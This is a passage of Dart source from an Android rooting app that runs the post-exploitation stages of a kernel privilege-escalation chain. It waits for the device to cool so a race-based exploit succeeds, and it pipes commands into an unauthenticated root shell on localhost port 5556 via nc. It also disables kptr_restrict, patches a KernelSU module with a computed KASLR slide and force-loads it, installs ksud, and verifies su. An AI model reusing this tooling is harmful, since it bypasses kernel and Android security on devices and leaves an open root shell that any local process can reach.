  static String _normVer(String raw) {
    final m = RegExp(r'[vV]?(\d+(?:\.\d+)+)').firstMatch(raw.trim());
    return m?.group(1) ?? raw.trim();
  }

  /// 开打前的温度闸（读 thermal_zone0，单位 m℃）
  ///
  /// 两级（用户指定）：
  /// · **>40°C 提醒**：照打，但日志/建议里提示偏高；
  /// · **≥45°C 阻断**：先等降温（10s × 9 = 最多 90s），降下来再打。
  /// 为什么管温度：>60°C 时 CPU 降到 1.3GHz，泄漏/命中都会掉；有余温时竞态时序也漂移，
  /// 表现为"越跑越差 + 更容易 panic"。
  static const int _tempWarnMc = 40000;    // 40.0°C 以上提醒
  static const int _tempBlockMc = 45000;   // 45.0°C 及以上阻断
  static const int _tempGateTries = 30;    // 最多等 30×10s = 5min（真机上从 68°C 降到 45°C 要几分钟）

  Future<void> _cooldownGate() async {
    for (var i = 0; i < _tempGateTries; i++) {
      final r = await ShizukuShell.run(
          'cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null');
      final t = int.tryParse(RegExp(r'\d+').firstMatch(r.out)?.group(0) ?? '') ?? 0;
      if (t <= 0) return;
      health['T'] = '$t';
      notifyListeners();
      final c = (t / 1000).toStringAsFixed(1);
      if (t >= _tempBlockMc) {
        _log('[temp] 机身 ${c}°C ≥45°C，阻断开打，等 10s 降温（第 ${i + 1}/$_tempGateTries 次）');
        await ShizukuShell.run('input keyevent 224 2>/dev/null');
        await _sleep(10000);
        continue;
      }
      if (t > _tempWarnMc) {
        _log('[temp] ⚠ 机身 ${c}°C（>40°C 偏高，但 <45°C 放行）：命中率可能偏低，建议再晾一会儿');
      } else if (i > 0) {
        _log('[temp] ${c}°C 已降到 40°C 以下，开打');
      }
      return;
    }
    // 等满 5 分钟还降不下来 ⇒ **直接放弃本轮**，而不是硬打。
    // 实测：机身 68°C + load 19 时打，几乎必 panic（命中率也趋近 0），只会白烧一次重启。
    _log('[temp] ✗ 等满 ${_tempGateTries * 10 ~/ 60} 分钟仍 ≥45°C，放弃本轮（机身过热时打必崩）');
    lastError = '机身温度过高（≥45°C 持续 ${_tempGateTries * 10 ~/ 60} 分钟未降）：'
        '先关屏静置 10–15 分钟降到 40°C 以下再跑；过热时命中率≈0 且极易 panic';
    _stop = true;
  }

  Future<bool> _ksuSuReady() async {
    final r = await ShizukuShell.run(
        'command -v su >/dev/null 2>&1 && echo Y || '
        '([ -x /data/adb/ksud ] && echo Y) || echo N');
    return r.out.contains('Y');
  }

  /// 自己执行 KernelSU 的用户态安装（管理器"安装"按钮做的第二件事）
  ///
  /// 相当于：
  ///   `<nativeLibDir>/libksud.so install --libadbroot <nativeLibDir>/libadbroot.so
  ///                                    --data-path /data/user_de/0/me.weishu.kernelsu`
  /// 效果：/data/adb/ksud 就位 + /data/adb/ksu/{bin,lib} 解包 + 软链；
  /// 之后内核的 sucompat 才会把 `su` 劫持到 ksud（见 kernel/feature/sucompat.c）。
  /// 全程只写 /data/adb，不需要解锁 BL、不碰 boot.img。
  Future<bool> _ksuUserspaceInstall() async {
    const pkg = 'me.weishu.kernelsu';
    // 1) 找 nativeLibDir（libksud.so / libadbroot.so 在那里）
    final r = await ShizukuShell.run(
        'A=\$(pm path $pkg 2>/dev/null | head -1 | sed "s/^package://")'
        '; B=\$(dirname "\$A")'
        '; for d in "\$B"/lib/*; do [ -f "\$d/libksud.so" ] && echo LIB=\$d; done'
        '; echo DEVDIR=/data/user_de/0/$pkg'
        '; echo HAVEDEV=\$([ -d /data/user_de/0/$pkg ] && echo 1 || echo 0)');
    final lib = RegExp(r'^LIB=(\S+)', multiLine: true).firstMatch(r.out)?.group(1) ?? '';
    if (lib.isEmpty) {
      _log('[ksu] 找不到 libksud.so（pm path 拿不到 nativeLibDir）：${r.out.trim()}');
      return false;
    }
    _log('[ksu] 用户态安装：$lib/libksud.so install …（KernelSU 自己也是跑这一条）');
    final cmd = '"$lib/libksud.so" install'
        ' --libadbroot "$lib/libadbroot.so"'
        ' --data-path /data/user_de/0/$pkg'
        ' 2>&1; echo INSTALL_RC=\$?'
        '; ls -l /data/adb/ksud /data/adb/ksu/bin/ksud 2>&1 | head -3'
        '; echo SUCHK=\$(command -v su 2>/dev/null || echo none)';
    final x = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
    _log('[ksu] 安装结果：${x.out.trim()}');
    final ok = RegExp(r'INSTALL_RC=0').hasMatch(x.out) ||
        RegExp(r'/data/adb/ksud').hasMatch(x.out);
    return ok;
  }

  /// 上次重启的原因（panic 现场）
  ///
  /// 只有拿到 root 才读得到：`/sys/fs/pstore/*` 是 ramoops（上一次崩溃的内核日志），
  /// `/proc/last_kmsg` 是更老的接口。App 每次拿到 root 就顺手抓一次，
  /// 下次再遇到"莫名重启"时，日志里直接有 panic 的那几行。
  Future<void> collectLastCrash() async {
    try {
      final cmd = 'echo PSTORE=\$(ls /sys/fs/pstore 2>/dev/null | tr "\\n" ",")'
          '; echo RESET=\$(getprop sys.resettype 2>/dev/null)'
          '; echo LAST=\$(getprop sys.boot.reason.last 2>/dev/null)'
          '; echo ---RAMOOPS-TAIL---'
          '; for f in /sys/fs/pstore/console-ramoops* /sys/fs/pstore/dmesg-ramoops*; do'
          ' [ -f "\$f" ] && { echo "## \$f"; grep -aE "Kernel panic|Unable to handle|Internal error|BUG:|Oops|pc :|lr :|Call trace" "\$f" | tail -12; }; done'
          '; echo ---LASTKMSG---'
          '; [ -f /proc/last_kmsg ] && grep -aE "Kernel panic|Unable to handle|Internal error|BUG:|Oops" /proc/last_kmsg | tail -8'
          '; echo ---END---';
      final r = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
      final t = r.out.trim();
      if (t.isEmpty) return;
      _log('[crash] 上次重启现场：');
      for (final l in t.split('\n')) {
        if (l.trim().isNotEmpty) _log('  $l');
      }
    } catch (_) {}
  }

  /// ⑦ 的真实状态：**模块加载成功 ≠ KernelSU 可用**
  ///
  /// 三件事要分开看：
  /// 1. `/proc/modules` 里有 `kernelsu`（insmod/finit 成功）
  /// 2. `/sys/module/kernelsu` 存在（模块真的注册进 sysfs，能区分"载入即返回"的假成功）
  /// 3. `su` 存在（**由管理器释放**，与 1/2 无关）
  Future<Map<String, String>> _ksuState() async {
    final m = <String, String>{};
    try {
      final r = await ShizukuShell.run(
        'echo MODCNT=\$(grep -c "^kernelsu" /proc/modules 2>/dev/null || echo 0)'
        '; echo SYSFS=\$([ -d /sys/module/kernelsu ] && echo 1 || echo 0)'
        '; echo MODLINE=\$(grep "^kernelsu" /proc/modules 2>/dev/null | head -1 | cut -c1-90)'
        '; echo SU=\$(command -v su 2>/dev/null || ls /data/adb/ksu/bin/su 2>/dev/null || echo)'
        '; echo KSUDIR=\$([ -d /data/adb/ksu ] && echo 1 || echo 0)'
        '; echo APP=\$(pm list packages 2>/dev/null | grep -c me.weishu.kernelsu)');
      for (final line in r.out.split('\n')) {
        final i = line.indexOf('=');
        if (i > 0) m[line.substring(0, i).trim()] = line.substring(i + 1).trim();
      }
    } catch (_) {}
    return m;
  }

  /// ⑦ 之后：KernelSU 模块已在 /proc/modules，但 **su 是由管理器（KSU App）释放到
  /// /data/adb/ksu/bin 的**，模块加载 ≠ su 可用。这里等最多 10s 并记录现场。
  Future<void> _afterKsuLoaded() async {
    // 1) 先等几秒（有的是 insmod 后立刻可读）
    for (var i = 0; i < 3; i++) {
      final r = await ShizukuShell.run(
          'ls /data/adb/ksu/bin/su /system/bin/su 2>/dev/null | head -1');
      if (r.out.trim().isNotEmpty) break;
      await _sleep(2000);
    }
    // 2) 还没有 su ⇒ 自己跑 KernelSU 的**用户态安装**（管理器里的"安装"做的就是这件事）
    //
    // 依据 KernelSU 源码：
    //  · kernel/feature/sucompat.c:4  `#define SU_PATH "/system/bin/su"`，
    //    在 faccessat/newfstatat/execve 上把 su 劫持成 **/data/adb/ksud**，
    //    且只有 `is_ksud_exists()` 为真时才劫持 ⇒ 没有 /data/adb/ksud 时 `su` 就是 ENOENT。
    //  · kernel/runtime/ksud.h:6 `KSUD_PATH "/data/adb/ksud"`。
    //  · 管理器的 install()（ui/util/KsuCli.kt）只是执行
    //    `<nativeLibDir>/libksud.so install --libadbroot <libadbroot.so> --data-path <deviceProtectedDataDir>`，
    //    而 userspace/ksud/src/utils.rs::install() 就是把自己拷到 /data/adb/ksud + 解出 assets + 建软链。
    //  ⇒ 我们已经有 root（⑥ 的自制模块），可以自己把这一步做掉，**不需要解锁 BL、不需要刷 boot.img**。
    if (await _ksuSuReady() == false) {
      // 只在「模块确实注册进 sysfs」且「本 boot 还没试过」时才动 ksud install：
      // 往半加载的 KSU 模块发 prctl 有可能把内核打崩（真机出现过早期 panic，等 [crash] 证实）
      final ks = await _ksuState();
      final sysfsOk = (ks['SYSFS'] ?? '0') == '1';
      final tried = await ShizukuShell.run(
          'ls /data/local/tmp/rk/.ksud_tried_\$(cat /proc/sys/kernel/random/boot_id) 2>/dev/null');
      if (!sysfsOk) {
        _log('[ksu] 跳过用户态安装：/sys/module/kernelsu 不存在（模块没真正注册，戳它会崩）');
      } else if (tried.out.trim().isNotEmpty) {
        _log('[ksu] 本 boot 已试过 ksud 安装，跳过（避免重复戳内核）');
      } else {
        await ShizukuShell.run(
            'touch /data/local/tmp/rk/.ksud_tried_\$(cat /proc/sys/kernel/random/boot_id)');
        await _ksuUserspaceInstall();
      }
    }
    // 3) 还没有 su ⇒ 把 KernelSU 管理器**拉起来一次**
    //    su/ksud 是管理器在"检测到内核"之后才释放到 /data/adb/ksu/bin 的，没人打开它就一直空着。
    //    注意：这不是让它走"安装/修复"（那是解锁后改 boot.img 的注入流程，与本 LKM 路径无关）。
    if (await _ksuSuReady() == false) {
      final am = await ShizukuShell.run(
          'am start -n me.weishu.kernelsu/.ui.MainActivity 2>&1 '
          '|| monkey -p me.weishu.kernelsu -c android.intent.category.LAUNCHER 1 2>&1');
      _log('[ksu] su 尚未出现，已尝试拉起 KernelSU 管理器：'
          '${am.out.trim().split("\n").last}');
      for (var i = 0; i < 4; i++) {
        await _sleep(2000);
        final r = await ShizukuShell.run(
            'ls /data/adb/ksu/bin/su /system/bin/su 2>/dev/null | head -1');
        if (r.out.trim().isNotEmpty) {
          _log('[ksu] 管理器初始化完成，su 已就位：${r.out.trim()}');
          break;
        }
      }
      // 拉起后把界面收回去，别挡住用户
      await ShizukuShell.run('am force-stop me.weishu.kernelsu 2>/dev/null');
    }
    final st = await _ksuState();
    final modOk = (int.tryParse(st['MODCNT'] ?? '0') ?? 0) > 0;
    final sysfs = (st['SYSFS'] ?? '0') == '1';
    _log('[ksu] 模块状态：/proc/modules=${modOk ? "有 kernelsu" : "无"}'
        ' · /sys/module/kernelsu=${sysfs ? "存在" : "缺失"}'
        ' · su=${(st['SU'] ?? '').isEmpty ? "缺失" : st['SU']}'
        ' · /data/adb/ksu=${(st['KSUDIR'] ?? '0') == '1' ? "已初始化" : "未初始化"}');
    if (modOk && !sysfs) {
      _log('[ksu] ⚠ 模块在 /proc/modules 里但 /sys/module 没有它 ⇒ 可能是"载入即退出"或加载不完整');
    }
    await _diag('ksu');
    await _diagRoot('ksu');
  }

  Future<void> _runKsu() async {
    _stage(StageId.ksu, StageStatus.running, detail: '等候选进程自加载…');
    // 首选：候选进程已拿到全 caps，自己在 post_root 里跑 ksupatch + ml2（不依赖 root shell）
    for (var i = 0; i < 12; i++) {
      final n = int.tryParse(
              (await ShizukuShell.run('grep -c ^kernelsu /proc/modules 2>/dev/null'))
                      .out
                      .trim()) ??
          0;
      if (n > 0) {
        _log('[ksu] 候选进程已自行加载 kernelsu（无需 root shell）');
        final sc = await ShizukuShell.run('cat $workDir/ksu_self.log 2>/dev/null | tail -6');
        if (sc.out.trim().isNotEmpty) _log(sc.all);
        await _afterKsuLoaded();
        _stage(StageId.ksu, StageStatus.ok, detail: 'kernelsu 已加载（自加载路径）');
        _advice();
        return;
      }
      if (i == 0) _log('[ksu] 等待候选自加载（最多 24s）…');
      await _sleep(2000);
    }
    // 回退：通过 5556 root shell（老路径）
    _stage(StageId.ksu, StageStatus.running, detail: '补丁 + 加载（root shell）…');
    phase = '加载 KernelSU';
    // 注意：ksupatch 的退出码 3 只表示"有 __kcfi_typeid_* 没在 kallsyms 里"（这些是模块自带的
    // 类型哈希，必须保留原值，不是错误）。所以这里不用 && 短路，仍然尝试加载并回报各自 RC。
    final slideHex = calib.textSlide.toRadixString(16);
    final cmd = 'cd $workDir; chmod 755 ksupatch ml2 ksu_template.ko; '
        // ① 常规：读 /proc/kallsyms 真地址（需要能读，通常 root）
        'echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null; '
        'rm -f ksu_run.ko; ./ksupatch ksu_template.ko ksu_run.ko; echo PATCH_RC=\$?; '
        // ② 兜底：离线符号表 + KASLR slide（不需要 root / 不需要 kptr_restrict）
        'if [ ! -s ksu_run.ko ]; then gzip -dc ksyms.bin.gz > /tmp/ksyms.txt; '
        './ksupatch ksu_template.ko ksu_run.ko --table /tmp/ksyms.txt --slide $slideHex; fi; '
        'echo PATCH_RC2=\$?; '
        './ml2 ksu_run.ko allow_shell=1; echo LOAD_RC=\$?; '
        'grep -c kernelsu /proc/modules; dmesg | grep -i kernelsu | tail -6';
    final r = await ShizukuShell.run('echo ${_shq(cmd)} | nc 127.0.0.1 5556 2>&1');
    _log(r.all);
    await _sleep(2000);
    final chk = await ShizukuShell.run('grep -c kernelsu /proc/modules');
    final n = int.tryParse(chk.out.trim()) ?? 0;
    if (n > 0) {
      await _afterKsuLoaded();
      _stage(StageId.ksu, StageStatus.ok, detail: 'kernelsu 已加载');
      _advice();
      return;
    }
    final pr = RegExp(r'PATCH_RC=(\d+)').firstMatch(r.out)?.group(1) ?? '?';
    final lr = RegExp(r'LOAD_RC=(\d+)').firstMatch(r.out)?.group(1) ?? '?';
    _stage(StageId.ksu, StageStatus.failed,
        detail: 'kernelsu 未加载（patch_rc=$pr load_rc=$lr）');
    lastError = 'KSU 加载失败：patch_rc=$pr load_rc=$lr（看日志 dmesg）';
    _advice();
  }

  Future<void> _runVerify() async {
    _stage(StageId.verify, StageStatus.running, detail: 'su 验证…');
    phase = '验证 su';
    // su 不一定在 PATH：KernelSU 的 su 由管理器放到 /data/adb/ksu/bin，
    // 也有机型是 /system/xbin/su 或 /debug_ramdisk/su。逐个试，全部记录（排障用）。
    const cands = <String>[
      'su',
      '/system/bin/su',
      '/system/xbin/su',
      '/data/adb/ksu/bin/su',
      '/debug_ramdisk/su',
    ];
    String? hitPath;
    String? hitLine;
    for (final p in cands) {
      final r = await ShizukuShell.run('$p -c id 2>&1');
      final out = r.out.trim();
      final first = out.isEmpty ? '(空)' : out.split('\n').first;
      _log('[verify] $p → $first');
      if (RegExp(r'uid=0\(root\)').hasMatch(out) || out.contains('u:r:ksu:s0')) {
        hitPath = p;
        hitLine = first;
        break;
      }
    }
    if (hitLine != null) {
      _stage(StageId.verify, StageStatus.ok, detail: 'su 可用（$hitPath）· $hitLine');
      success = true;
      phase = '越狱成功';
      _log('[verify] 成功：$hitLine');
      await cleanupAfterSuccess();
      _log('[verify] 若 KernelSU 面板仍显示"未安装/未工作"，先对 KernelSU 清后台或用软重启，再打开它');
      _advice();
      return;
    }

    // 失败：把「模块是否在、管理器是否装、su 在哪、dmesg 说啥」一次性打进日志
    await _diag('verify-fail');
    await _diagRoot('verify-fail');
    final st = await _ksuState();
    final ksuLoaded = (int.tryParse(st['MODCNT'] ?? '0') ?? 0) > 0;
    final sysfs = (st['SYSFS'] ?? '0') == '1';
    final appInstalled = (int.tryParse(st['APP'] ?? '0') ?? 0) > 0;
    final dirExists = (st['KSUDIR'] ?? '0') == '1';
    _log('[verify] 现场：kernelsu 模块=${ksuLoaded ? "有" : "无"} · sysfs=${sysfs ? "有" : "无"}'
        ' · 管理器=${appInstalled ? "已装${ksuAppVersion.isEmpty ? "" : " v$ksuAppVersion"}" : "未装"}'
        ' · /data/adb/ksu=${dirExists ? "已初始化" : "未初始化"}');

    String why;
    if (ksuLoaded && !dirExists) {
      why = 'KernelSU 模块已加载，但 /data/adb/ksu 不存在 ⇒ 管理器还没初始化。'
          'su/ksud 是管理器**检测到内核后**才释放到 /data/adb/ksu/bin 的：'
          '手动打开一次 KernelSU（不是点它的"安装"，那是解锁后改 boot.img 的注入流程），'
          '再回来重跑 ⑦⑧；若它打开后仍显示"未安装"，把本页日志发给作者（[diag-root] 里有内核镜像核对结果）';
    } else if (ksuLoaded && !appInstalled) {
      why = 'KernelSU 模块已加载，但没装 KernelSU 管理器 ⇒ 没有 su。装好管理器并打开一次，再重跑 ⑦⑧';
    } else if (ksuLoaded && !sysfs) {
      why = 'kernelsu 在 /proc/modules 但 /sys/module 没有它 ⇒ 加载不完整（看 dmesg 的 ksu 行）';
    } else if (!ksuLoaded) {
      why = 'su 不存在且 kernelsu 模块不在 /proc/modules ⇒ ⑦ 其实没成功，重跑 ⑦';
    } else {
      why = 'su 不存在（模块在、管理器在）：看日志 [diag-root:verify-fail] 的 dmesg KSU 行';
    }
    _log('[verify] 失败原因判定：$why');
    _stage(StageId.verify, StageStatus.failed, detail: 'su 不存在');
    lastError = why;
    _advice();
  }

  // ---------------------------------------------------------------- 统计持久化

  Future<void> _loadStats() async {
    for (final e in _prefKey.entries) {
      final raw = await ShizukuShell.getPref('${e.value}.stat');
      if (raw != null && raw.contains('/')) {
        final p = raw.split('/');
        final s = _byId[e.key]!;
        s.tries = int.tryParse(p[0]) ?? 0;
        s.hits = int.tryParse(p[1]) ?? 0;
      }
    }
  }

  Future<void> _saveStats() async {
    for (final e in _prefKey.entries) {
      final s = _byId[e.key]!;
      await ShizukuShell.setPref('${e.value}.stat', '${s.tries}/${s.hits}');
    }
  }
}
